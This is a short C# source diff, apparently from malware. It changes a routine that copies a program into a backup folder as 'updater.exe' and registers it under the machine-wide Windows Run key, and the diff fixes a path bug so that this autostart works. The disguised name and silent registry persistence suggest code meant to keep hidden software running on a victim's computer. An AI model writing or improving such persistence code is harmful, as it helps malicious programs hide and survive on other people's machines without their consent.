@@ -110,9 +110,10 @@ namespace Twient
 		{
 			CheckProcess();
 			//File.Copy(text, GlobalVars.Autostart + "\\updater.exe");
-			File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");
+			if (File.Exists(GlobalVars.Backpath + "\\updater.exe")==false)
+				File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");
 			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-			registryKey.SetValue("updater", GlobalVars.Backpath + "updater.exe");
+			registryKey.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");
 			registryKey.Close();
 		}
 		
